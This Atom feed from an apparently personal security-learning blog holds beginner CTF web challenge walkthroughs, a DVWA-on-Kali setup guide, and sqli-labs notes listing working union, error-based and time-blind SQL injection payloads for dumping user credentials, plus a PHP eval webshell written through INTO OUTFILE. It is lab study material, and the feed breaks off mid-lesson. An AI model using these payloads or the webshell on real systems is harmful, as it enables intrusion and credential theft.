<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://kite-007.github.io</id>
    <title>Gridea</title>
    <updated>2020-10-26T03:06:34.768Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://kite-007.github.io"/>
    <link rel="self" href="https://kite-007.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://kite-007.github.io/images/avatar.png</logo>
    <icon>https://kite-007.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, Gridea</rights>
    <entry>
        <title type="html"><![CDATA[WEB新手区]]></title>
        <id>https://kite-007.github.io/post/web-xin-shou-qu/</id>
        <link href="https://kite-007.github.io/post/web-xin-shou-qu/">
        </link>
        <updated>2020-10-13T13:42:06.000Z</updated>
        <content type="html"><![CDATA[<p>所用插件：X-Forwarded-For Header、HackBar、FoxyProxy。<br>
一，xff_referer</p>
<p>伪造IP与Referer<br>
1.<br>
<img src="https://kite-007.github.io/post-images/1602602934990.png" alt="" loading="lazy"><br>
2.使用X-Forwarded-For Header伪造123.123.123.123<br>
<img src="https://kite-007.github.io/post-images/1602602940134.png" alt="" loading="lazy"><br>
3.使用HackBar打勾Referer伪造<br>
<img src="https://kite-007.github.io/post-images/1602602945517.png" alt="" loading="lazy"></p>
<p>二，backup</p>
<p>查看备份文件<br>
网页备份文件的后缀为.bak<br>
1.<br>
<img src="https://kite-007.github.io/post-images/1602602978909.png" alt="" loading="lazy"><br>
2.请求index.php.bak<br>
<img src="https://kite-007.github.io/post-images/1602602990608.png" alt="" loading="lazy"><br>
3.查看index.php的备份文件<br>
<img src="https://kite-007.github.io/post-images/1602603003613.png" alt="" loading="lazy"></p>
<p>三，command_execution</p>
<p>查找flag<br>
1.<br>
<img src="https://kite-007.github.io/post-images/1602603036707.png" alt="" loading="lazy"><br>
2.ping127.0.0.1<br>
<img src="https://kite-007.github.io/post-images/1602603046039.png" alt="" loading="lazy"><br>
3.查找flag.txt<br>
<img src="https://kite-007.github.io/post-images/1602603051618.png" alt="" loading="lazy"><br>
4.<br>
<img src="https://kite-007.github.io/post-images/1602603056682.png" alt="" loading="lazy"></p>
<p>四，cookie</p>
<p>了解cookie</p>
<p>cookie为储存在用户本地终端上的数据<br>
1.<br>
<img src="https://kite-007.github.io/post-images/1602603086624.png" alt="" loading="lazy"><br>
2.cookie在开发者工具，网络一栏，点请求的网址，查看cookie<br>
<img src="https://kite-007.github.io/post-images/1602603098830.png" alt="" loading="lazy"><br>
3.继续查看响应<br>
<img src="https://kite-007.github.io/post-images/1602603109036.png" alt="" loading="lazy"></p>
<p>五，disabled_button</p>
<p>disabled=&quot;&quot;使input功能丧失<br>
1.<br>
<img src="https://kite-007.github.io/post-images/1602603150444.png" alt="" loading="lazy"><br>
2.查看源码，发现disabled=&quot;&quot;,使input一行功能丧失，所以<br>
<img src="https://kite-007.github.io/post-images/1602603157099.png" alt="" loading="lazy"><br>
3.所以去掉disabled=&quot;&quot;后响应网站，得到flag<br>
<img src="https://kite-007.github.io/post-images/1602603161359.png" alt="" loading="lazy"><br>
4.另一种方式<br>
<img src="https://kite-007.github.io/post-images/1602603165655.png" alt="" loading="lazy"></p>
<p>六，get_post</p>
<p>了解get post<br>
GET - 从资源请求数据<br>
POST - 向资源提交数据</p>
<ol>
<li></li>
</ol>
<p><img src="https://kite-007.github.io/post-images/1602603195591.png" alt="" loading="lazy"><br>
2.get:.在url后加入/?a=1<br>
<img src="https://kite-007.github.io/post-images/1602603200041.png" alt="" loading="lazy"><br>
3.勾选post data输入b=2<br>
<img src="https://kite-007.github.io/post-images/1602603204698.png" alt="" loading="lazy"></p>
<p>七，robots</p>
<p>了解robots<br>
robots是网站跟爬虫间的协议<br>
1.<br>
<img src="https://kite-007.github.io/post-images/1602603230285.png" alt="" loading="lazy"><br>
2.在url栏后加/robots.txt查看，得到如图<br>
<img src="https://kite-007.github.io/post-images/1602603236973.png" alt="" loading="lazy"><br>
3.<br>
<img src="https://kite-007.github.io/post-images/1602603241748.png" alt="" loading="lazy"></p>
<p>八，simple_js</p>
<p>js语法<br>
1.进入随便输入密码查看开发者工具<br>
<img src="https://kite-007.github.io/post-images/1602603267071.png" alt="" loading="lazy"><br>
2.分析:无论输入什么，都返回了pass，而密码在dechiffre（h），而h是&quot;\x···\x30&quot;<br>
<img src="https://kite-007.github.io/post-images/1602603277929.png" alt="" loading="lazy"><br>
3.对h进行转码，得到一组ASCII码（https://www.bejson.com/convert/ox2str/）<br>
<img src="https://kite-007.github.io/post-images/1602603296670.png" alt="" loading="lazy"><br>
4.ASCII编码转换（https://www.qqxiuzi.cn/bianma/ascii.htm）<br>
<img src="https://kite-007.github.io/post-images/1602603301203.png" alt="" loading="lazy"><br>
5.完成<br>
<img src="https://kite-007.github.io/post-images/1602603307908.png" alt="" loading="lazy"></p>
<p>九，simple_php</p>
<p>php特性<br>
在PHP中，不同类型比较时会被自动转换成相同的类型</p>
<p>1.发现：a要为零，还得满足a为字符串，则请求/?a=0.0(0.0表示字符串)<br>
<img src="https://kite-007.github.io/post-images/1602603323157.png" alt="" loading="lazy"><br>
2.b不能是数字，b还要大于1234，所以让b=12345a（字符串），到比较时b会被转化类型<br>
<img src="https://kite-007.github.io/post-images/1602603333969.png" alt="" loading="lazy"><br>
3.<br>
<img src="https://kite-007.github.io/post-images/1602603338681.png" alt="" loading="lazy"></p>
<p>十，view_source</p>
<p>f12开发者工具</p>
<ol>
<li></li>
</ol>
<p><img src="https://kite-007.github.io/post-images/1602603361874.png" alt="" loading="lazy"><br>
2.f12开发者工具<br>
<img src="https://kite-007.github.io/post-images/1602603370722.png" alt="" loading="lazy"></p>
<p>十一，weak_auth</p>
<p>Burp密码爆破</p>
<ol>
<li></li>
</ol>
<p><img src="https://kite-007.github.io/post-images/1602603420235.png" alt="" loading="lazy"><br>
2.随便输入用户名，发现用户名为admin<br>
<img src="https://kite-007.github.io/post-images/1602603430620.png" alt="" loading="lazy"><br>
3.<br>
<img src="https://kite-007.github.io/post-images/1602603436276.png" alt="" loading="lazy"><br>
4.查看源码，发现需要一个字典（密码爆破），所以使用Burp<br>
<img src="https://kite-007.github.io/post-images/1602603445185.png" alt="" loading="lazy"><br>
5.使用Burp抓包，设置变量<br>
<img src="https://kite-007.github.io/post-images/1602603464715.png" alt="" loading="lazy"><br>
6.<br>
<img src="https://kite-007.github.io/post-images/1602603471991.png" alt="" loading="lazy"><br>
7.加载字典<br>
<img src="https://kite-007.github.io/post-images/1602603483650.png" alt="" loading="lazy"><br>
8.设置线程（最大127），得到密码为123456<br>
<img src="https://kite-007.github.io/post-images/1602603487809.png" alt="" loading="lazy"><br>
9.<br>
<img src="https://kite-007.github.io/post-images/1602603495036.png" alt="" loading="lazy"></p>
<p>十二，webshell</p>
<p>了解shell，蚁剑<br>
1.<br>
<img src="https://kite-007.github.io/post-images/1602603509021.png" alt="" loading="lazy"><br>
2.<br>
<img src="https://kite-007.github.io/post-images/1602603516788.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[kali-linux 搭建DVWA]]></title>
        <id>https://kite-007.github.io/post/kali-linux-da-jian-dvwa/</id>
        <link href="https://kite-007.github.io/post/kali-linux-da-jian-dvwa/">
        </link>
        <updated>2020-10-12T12:02:41.000Z</updated>
        <content type="html"><![CDATA[<p>在主机下载DVWAhttp://www.dvwa.co.uk/并解压，重命名为dvwa后拖进虚拟机的桌面目录。（VMware Tools安装方法https://blog.csdn.net/u011585332/article/details/105120544?utm_source=app）</p>
<p>👁第一：打开dvwa/dvwa/config，将config.inc.php.dist的后缀.dist去掉。<br>
<img src="https://kite-007.github.io/post-images/1602505129501.png" alt="" loading="lazy"></p>
<p>👁第二：打开config.inc.php<br>
修改为：<br>
$_DVWA[ 'db_user' ]     = 'dvwa';<br>
$_DVWA[ 'db_password' ] = 'dvwa';</p>
<p>👁第三：进入终端<br>
输入：<br>
chmod -R 777 /root/桌面/dvwa  	                #赋予dvwa文件夹相应的权限<br>
mv /root/桌面/dvwa /var/www/html             #将桌面上的dvwa文件移至/var/www/htm下<br>
service mysql start		#启动mysql服务<br>
mysql -u root -p 		#进入mysql（密码默认为空/root，直接回车）<br>
create user 'dvwa'@'localhost' identified by 'dvwa';#创建用户名（对应第二步）<br>
grant all on <em>.</em> to 'dvwa'@'localhost';                                  #赋权<br>
set password for 'dvwa'@'localhost' = password('dvwa');#设置密码（对应第二步）<br>
exit                #退出mysql<br>
service apache2 start 	      #启动apache2服务<br>
<img src="https://kite-007.github.io/post-images/1602506995688.png" alt="" loading="lazy"></p>
<p>👁第四：打开浏览器，输入127.0.0.1/dvwa，回车进入后会自动跳转到127.0.0.1/dvwa/setup.php<br>
默认账号密码：admin/password<br>
<img src="https://kite-007.github.io/post-images/1602507875585.png" alt="" loading="lazy"><br>
<img src="https://kite-007.github.io/post-images/1602507814348.png" alt="" loading="lazy"></p>
<p>👁第五：后续问题解决：https://www.jianshu.com/p/05135f8de848（参考）</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqli-Less]]></title>
        <id>https://kite-007.github.io/post/sql-injections/</id>
        <link href="https://kite-007.github.io/post/sql-injections/">
        </link>
        <updated>2020-10-05T02:59:11.000Z</updated>
        <content type="html"><![CDATA[<p>为了方便学习在$sql语句下加入：<br>
echo $sql;<br>
echo &quot;<br>&quot;;</p>
<p>less-1<br>
“”<br>
payload：<br>
?id=1' --+//报错，--+为注释掉原后面的“'”；<br>
?id=1' order by X --+(X=1,2,3,4)//查询字段数，该表有三个<br>
?id=-1' union select 1,2,3 --+//查看字段回显位置，这里为2，3<br>
?id=-1' union select 1,2,group_concat(schema_name)from information_schema.schemata--+联合查询取出数据<br>
?id=-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='security'--+取出所有表信息<br>
?id=-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'--+取出所有列信息<br>
?id=-1' union select 1,2,group_concat(concat_ws('~',username,password))from security.users--+取出账户信息</p>
<p>schema：数据库中schema是数据库对象集合<br>
information_schema 信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息<br>
order by X  //给第X列数据进行排序<br>
group_concat()    //将数据用一行显示出来<br>
concat_ws('C',A,B)  //用”C“将“A”与“B”隔开,C不为NULL<br>
查库：select schema_name from information_schema.schemata<br>
查表：select table_name from information_schema.tables where table_schema='security'<br>
查列：select column_name from information_schema.columns where table_name='users'<br>
查字段：select username,password from security.users</p>
<p>less-2</p>
<p>payload：<br>
?id=1' //查看判断报错，此处多了一个’，为数字型注入<br>
?id=1 order by X --+(X=1,2,3,4)//查询字段数，该表有三个<br>
?id=-1 union select 1,2,3 --+//查看字段回显位置，这里为2，3<br>
?id=-1 union select 1,2,group_concat(schema_name)from information_schema.schemata--+联合查询取出数据<br>
?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='security'--+取出所有表信息<br>
?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'--+取出所有列信息<br>
?id=-1 union select 1,2,group_concat(concat_ws('~',username,password))from security.users--+取出账户信息</p>
<p>less-3</p>
<p>payload：<br>
?id=1' //查看判断报错，此处1被('')包裹，所以在1后加')进行报错注入<br>
?id=1') //进行报错注入<br>
剩余同less-1</p>
<p>less-4</p>
<p>payload：<br>
?id=1' //查看判断报错，此处1被(&quot;&quot;)包裹，所以在1后加&quot;)进行报错注入<br>
?id=1&quot;) //进行报错注入<br>
剩余同less-1</p>
<p>less-5</p>
<p>payload:<br>
?id=1、?id=1'、?id=1&quot;、?id=1 --+、?id=1' --+、?id=1&quot; --+//进行报错判断1由'包裹<br>
?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)%23//爆库<br>
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23//爆表<br>
?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)%23//爆列<br>
?id=1' and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23//爆字段(用户名)//updatexml()这个函数最多只能爆32位字符,要爆的数据超过了这个位数,所使用limit 0,1来实现单个数据查询。<br>
?id=1' and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)%23//爆字段(密码)//limit X,1)其中（X=1，2，3，···，11）</p>
<p>concat()将多个字符串连接成一个字符串,返回结果为连接参数产生的字符串,如果有任何一个参数为null,则返回值为null。<br>
updatexml()函数：UPDATEXML (XML_document, XPath_string, new_value);<br>
第一个参数：XML_document是String格式，为XML文档对象的名称，<br>
第二个参数：XPath_string (Xpath格式的字符串) ，<br>
第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>
作用：改变文档中符合条件的节点的值<br>
改变XML_document中符合XPATH_string的值<br>
而我们的注入语句为：	<br>
updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<br>
其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出	<br>
ERROR 1105 (HY000): XPATH syntax error: ':root@localhost'<br>
xpath语法格式总结：http://www.uoften.com/article/125607.htm</p>
<p>less-6</p>
<p>payload:<br>
?id=1、?id=1'、?id=1&quot;、?id=1 --+、?id=1' --+、?id=1&quot; --+//进行报错判断1由&quot;包裹<br>
?id=1&quot; //进行报错注入<br>
剩余同less-5</p>
<p>less-7</p>
<p>payload：<br>
?id=1、?id=1'、?id=1&quot;、?id=1')、?id=1'))、?id=1 --+、?id=1' --+、?id=1&quot; --+、?id=1')) --+//进行报错判断1由'))包裹,提示使用into outfile<br>
?id=1')) order by X --+(X=1,2,3,4)//查询字段数，该表有三个<br>
?id=-1')) union select 1,2,'<?php @eval($_POST["pass"]);?>' into outfile'D:\phpStudy\PHPTutorial\WWW\sqli-labs-master\Less-7\test.php'--+<br>
test.php//进入后使用蚁剑，URL地址：http://127.0.0.1/sqli-labs-master/Less-7/test.php，连接密码：pass</p>
<p>1.show variables like '%secure%';查看 secure-file-priv 当前的值，如果显示为NULL，则需要打开C:Aphpstudy\PHPTutorial\MysQL\my.ini文件，在其中加上一句：secure_file_priv=&quot;/&quot;。<br>
2.一句话木马：php版本：<?php@eval($_POST["crow"]);?>其中crow是密码<br>
3.load_file() 读取本地文件 select load_file('C:\Wphpstudy\PHPTutoria www\lsgliLess-7\test.txt');<br>
4. into outfile 写文件 用法： select 'mysal is very good' into outfile 'test1.txt'；//不加括号！！！<br>
文件位置： C\phpstudy\PHPTutorial\MysQL\data<br>
或者是select 'crow 666' into outfile 'C:\phpstudy\PHPTutoria\www\sqli\Less-7\test.txt'；<br>
文件位置：C:\phpstudy\PHPTutoria\ww sqli\Less-7<br>
注意事项：\</p>
<p>less-8</p>
<p>payload：<br>
?id=1、?id=1'、?id=1' --+//进行报错判断1由'))包裹<br>
?id=1' order by X --+(X=1,2,3,4)//查询字段数，该表有三个<br>
?id=1' and if(length(database())=<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))--+//逐数猜测数据库的长度<br>
?id=1' and if(ascii(substr((select database()),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))--+//利用二分法进行猜测查询数据库的第一个字母<br>
?id=1' and if(ascii(substr((select schema_name from information_schema.schemata limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))--+//利用二分法进行猜测查询数据库中第五个数据库第二个字母，盲注爆库<br>
?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))--+//盲注爆表<br>
?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))--+//盲注爆列<br>
?id=1' and if(ascii(substr((select username from security.users limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))--+//盲注爆字段（用户名）<br>
?id=1' and if(ascii(substr((select password from security.users limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))--+//盲注爆字段（密码）</p>
<p>1.if(condition,A,B)，如果condition为真，则执行A，否则执行B<br>
2.sleep(A)，如果执行该函数，则会睡眠A秒再返回结果<br>
3.substr()函数：select substr(A,B,C)='s'；在A中从B位开始截取C位，与's'匹配，正确为1<br>
4. ascii()函数：ascii('a')；返回a的ascii值</p>
<p>less-9</p>
<p>payload：<br>
?id=1' order by X --+(X=1,2,3,···，99)//查询字段数，无法查询<br>
?id=1' and sleep(10)--+//发现睡眠较长时间，存在注入漏洞<br>
剩余同less-8</p>
<p>less-10</p>
<p>payload：<br>
?id=1&quot; order by X --+(X=1,2,3,···，99)//查询字段数，无法查询<br>
?id=1&quot; and sleep(10)--+//发现睡眠较长时间，存在注入漏洞<br>
剩余同less-8</p>
<p>less-11</p>
<p>payload：<br>
uname=admin&amp;passwd=admin&amp;submit=Submit//开启burp，用户名密码admin进行抓包<br>
uname=admin' #&amp;passwd=admin&amp;submit=Submit//在post方式下--+注释行不通，用#进行注释<br>
uname=admin' order by X #&amp;passwd=admin&amp;submit=Submit//（X=1，2，3）判断列数<br>
uname=-admin' union select 1,2 #&amp;passwd=admin&amp;submit=Submit//破坏用户民联合查询回显位置<br>
爆库uname=-admin' union select 1, group_concat(schema_name)from information_schema.schemata #&amp;passwd=admin&amp;submit=Submit<br>
爆表uname=-admin' union select 1, group_concat(table_name)from information_schema.tables where table_schema='security' #&amp;passwd=admin&amp;submit=Submit<br>
爆列uname=-admin' union select 1, group_concat(column_name)from information_schema.columns where table_name='users' #&amp;passwd=admin&amp;submit=Submit<br>
爆字段uname=-admin' union select 1, group_concat(concat_ws('~',username,password))from security.users#&amp;passwd=admin&amp;submit=Submit</p>
<p>less-12</p>
<p>payload:<br>
uname=admin&quot; #&amp;passwd=admin&amp;submit=Submit//判断包裹信息<br>
剩余同less-11</p>
<p>less-13</p>
<p>POST单引号变形双注入</p>
<p>admin admin,登录正确图片显示蓝色，错误显示红色，<br>
admin' 有报错信息，同第五关利用报错回显信息<br>
payload:<br>
admin'//判断<br>
uname=admin') order by 2#&amp;passwd=admin&amp;submit=Submit//判断<br>
爆库uname=admin') and updatexml(1,concat(0x7e,database(),0x7e),1)%23#&amp;passwd=admin&amp;submit=Submit<br>
爆表uname=admin') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23#&amp;passwd=admin&amp;submit=Submit<br>
爆列uname=admin') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)%23#&amp;passwd=admin&amp;submit=Submit<br>
爆字段uname=admin') and updatexml(1,concat(0x7e,(select (concat_ws('~',username,password)) from users limit 0,1),0x7e),1)%23#&amp;passwd=admin&amp;submit=Submit</p>
<p>less-14</p>
<p>payload:<br>
uname=admin&quot; #&amp;passwd=admin&amp;submit=Submit//判断包裹信息<br>
剩余同less-13</p>
<p>less-15</p>
<p>admin admin,登录正确图片显示蓝色，错误显示红色，<br>
admin' 无报错信息，同第八关利用延时判断<br>
payload:<br>
uname=admin' &amp;passwd=admin&amp;submit=Submit<br>
uname=admin' and if(length(database())=<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>8</mn></mrow><annotation encoding="application/x-tex">8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span></span></span></span>,1,sleep(5))#&amp;passwd=admin&amp;submit=Submit<br>
uname=admin' and if(ascii(substr((select database()),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))#&amp;passwd=admin&amp;submit=Submit<br>
uname=admin' and if(ascii(substr((select schema_name from information_schema.schemata limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))#&amp;passwd=admin&amp;submit=Submit<br>
uname=admin' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))#&amp;passwd=admin&amp;submit=Submit<br>
uname=admin' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))#&amp;passwd=admin&amp;submit=Submit<br>
uname=admin' and if(ascii(substr((select (concat_ws('~',username,password)) from security.users limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))#&amp;passwd=admin&amp;submit=Submit</p>
<p>less-16</p>
<p>payload:<br>
uname=admin&quot; &amp;passwd=admin&amp;submit=Submit<br>
剩余同less-15</p>
<p>less-17<br>
从报错发现，用户名加入单引号，则这个单引号会被转义，所以查看代码发现check_input()过滤了uname，所以从passwd进行报错注入<br>
payload：<br>
uname=admin&amp;passwd=admin' #&amp;submit=Submit<br>
uname=admin&amp;passwd=admin' and updatexml(1,concat(0x7e,database(),0x7e),1)%23#&amp;submit=Submit<br>
剩余同less-13</p>
<p>less-18</p>
<p>payload:<br>
uname=admin' #&amp;passwd=admin&amp;submit=Submit<br>
uname=admin&amp;passwd=admin' #&amp;submit=Submit//得知会对username，password进行转义<br>
//由题目提示，与User-Agent有关，从这里入手<br>
' or updatexml(1,concat(0x7e,database(),0x7e),1) or '1'='1//查看数据库<br>
